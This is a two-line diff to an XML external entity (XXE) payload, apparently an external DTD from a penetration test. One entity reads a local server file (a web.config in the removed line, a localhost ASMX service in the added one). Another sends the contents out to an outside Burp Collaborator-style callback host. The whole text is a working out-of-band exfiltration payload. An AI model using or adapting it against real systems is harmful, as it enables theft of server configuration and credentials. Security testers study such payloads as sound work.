@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///D:/QuadXChange/VirtualFolders/ancillary/web.config">
+<!ENTITY % data SYSTEM "file:///http://localhost/BE_HotelsV2/BE_Hotels.asmx">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://hyjlib4ebaxelqil748wb44j2a81w2kr.l.prod.burpcloth.infosec.a2z.com/?%data;'>">
